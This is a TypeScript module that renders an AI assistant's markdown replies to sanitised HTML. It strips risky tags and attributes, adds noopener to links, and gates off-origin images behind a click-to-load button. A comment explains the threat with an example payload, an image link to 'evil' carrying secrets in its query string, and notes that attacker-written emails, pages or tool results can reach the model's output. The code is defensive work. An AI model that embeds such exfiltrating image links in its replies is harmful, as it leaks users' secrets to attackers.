/*
 * Markdown rendering for assistant replies, matching the existing WebUI
 * (www/js/ui/format.js): marked with GFM + line breaks, then DOMPurify to sanitize
 * the HTML before it touches the DOM. DAWN's output is trusted-ish, but tool
 * results and web content flow through it, so we sanitize as a matter of course.
 */

import { marked } from "marked";
import DOMPurify from "dompurify";
import { emojify } from "../util/emoji.ts";
import { tagIfDawnApi } from "../util/dawn-app.ts";

marked.setOptions({ gfm: true, breaks: true });

/* GFM task lists: a text glyph instead of an <input> (inputs are removed from rendered markdown),
   so a checklist still shows which items are done. */
marked.use({
   renderer: {
      checkbox({ checked }: { checked: boolean }): string {
         return checked ? "☑ " : "☐ ";
      }
   }
});

/* Expand `:shortcode:` in the assistant's reply, mirroring the composer. Only
   plain text tokens are touched - `code`/`codespan` are skipped so literal colons
   in code samples stay literal, and only KNOWN shortcodes expand (emojify leaves
   the rest verbatim). walkTokens runs before rendering, so mutating token.text is
   what the renderer emits. */
marked.use({
   walkTokens: (token) => {
      if (token.type === "text" && typeof token.text === "string") {
         token.text = emojify(token.text);
      }
   }
});

/* This module's own DOMPurify instance (its hooks touch nothing else in the app). */
const purify = DOMPurify(window);

/* Reply and document markdown is untrusted (the model may echo an email, a web page, or a tool
   result an attacker wrote), and replies re-render on every stream delta. So nothing in it may
   fetch a URL by itself: only <img src> can, and that one waits for a click (gateImages, 4.7).
   Everything else that loads on its own is removed here, and nothing can forge the click-to-load
   placeholder (no forms or buttons, no data-* attributes, no inline style). */
const FORBID_TAGS = [
   "video", "audio", "source", "picture", "track", "image", "feimage", "input", "form", "button",
   "select", "textarea", "svg", "math"
];
const FORBID_ATTR = ["style", "srcset", "poster", "background", "xlink:href", "ping", "action", "formaction"];

/* Any link kept with target="_blank" also gets rel="noopener noreferrer" so the opened
   page cannot reach window.opener (reverse tabnabbing). DOMPurify already strips
   javascript:/dangerous hrefs; this closes the target hole on older engines too. */
purify.addHook("afterSanitizeAttributes", (node) => {
   if (!(node instanceof Element)) return;
   if (node.hasAttribute("target")) node.setAttribute("rel", "noopener noreferrer");
   const tag = node.tagName.toLowerCase();
   /* A URL only where it's meant to be: href on a link, src on an image (gated below). */
   if (tag !== "a") node.removeAttribute("href");
   if (tag !== "img") node.removeAttribute("src");
   node.classList.remove("md-img-blocked"); // only gateImages makes those
   if (!node.classList.length) node.removeAttribute("class");
   /* A reply's image/link to this origin's DAWN API must carry this app's login tag (DAWN's
      per-app logins), or it loads as the WebUI's login. No-op for any other URL. */
   for (const attr of ["src", "href"]) {
      const v = node.getAttribute(attr);
      if (v) {
         const tagged = tagIfDawnApi(v);
         if (tagged !== v) node.setAttribute(attr, tagged);
      }
   }
});

/* --- off-origin images never load on their own (EMAIL_PANEL_DESIGN 4.7) ------------------------
   Reply and document text can carry text an attacker chose (an email the model read, a web page, a
   tool result), and a reply re-renders on every stream delta: `![x](https://evil/?d=<secrets>)`
   would fetch mid-stream and leak. So an image from another site renders as a click-to-load
   placeholder naming its host; same-origin images (DAWN's /api/images), data: and blob: load as
   before. A click loads it, and that URL then stays loaded across re-renders for this page. */
const allowedImages = new Set<string>();
/* Marks the placeholders this module made (sanitized markdown can't carry data-* attributes). */
const GATE_NONCE = (globalThis.crypto?.randomUUID?.() ?? String(Math.random())).replace(/-/g, "");

function offOrigin(src: string): URL | null {
   let u: URL;
   try {
      u = new URL(src, window.location.href);
   } catch {
      return new URL("about:blank"); // unparseable: treat as off-origin (fail closed)
   }
   if (u.protocol === "data:" || u.protocol === "blob:") return null;
   if (u.origin === window.location.origin) return null;
   return u;
}

function gateImages(clean: string): string {
   if (!clean.includes("<img")) return clean;
   const tpl = document.createElement("template");
   tpl.innerHTML = clean; // inert: a <template>'s content never loads or runs
   for (const img of Array.from(tpl.content.querySelectorAll("img"))) {
      const src = img.getAttribute("src") ?? "";
      const u = offOrigin(src);
      if (u && u.protocol !== "http:" && u.protocol !== "https:") {
         img.remove(); // not a loadable web image (or unparseable): nothing to offer
         continue;
      }
      if (!u || allowedImages.has(u.href)) {
         img.setAttribute("referrerpolicy", "no-referrer");
         continue;
      }
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "md-img-blocked";
      btn.dataset.src = u.href;
      btn.dataset.gate = GATE_NONCE;
      btn.dataset.alt = img.getAttribute("alt") ?? "";
      btn.title = `Load an image from ${u.host}`;
      btn.textContent = `Image from ${u.host} · Load`;
      img.replaceWith(btn);
   }
   return tpl.innerHTML;
}

/* Wire click-to-load under `root` (one delegated listener). Returns its remover. */
export function wireImageGate(root: HTMLElement): () => void {
   const onClick = (e: MouseEvent): void => {
      const btn = (e.target as Element | null)?.closest?.<HTMLButtonElement>(".md-img-blocked");
      if (!btn || !root.contains(btn) || btn.dataset.gate !== GATE_NONCE) return; // only ours
      const url = btn.dataset.src ?? "";
      const u = offOrigin(url);
      if (!u || (u.protocol !== "http:" && u.protocol !== "https:")) return;
      allowedImages.add(url);
      const img = document.createElement("img");
      img.referrerPolicy = "no-referrer";
      img.alt = btn.dataset.alt ?? "";
      img.src = url;
      btn.replaceWith(img);
   };
   root.addEventListener("click", onClick);
   return () => root.removeEventListener("click", onClick);
}

/* Render markdown to sanitized HTML. Links open in a new tab (ADD_ATTR target),
   same allowance the existing WebUI makes. Off-origin images come back as placeholders. */
export function renderMarkdown(text: string): string {
   const html = marked.parse(text, { async: false });
   return gateImages(purify.sanitize(html, { ADD_ATTR: ["target"], FORBID_TAGS, FORBID_ATTR, ALLOW_DATA_ATTR: false }));
}
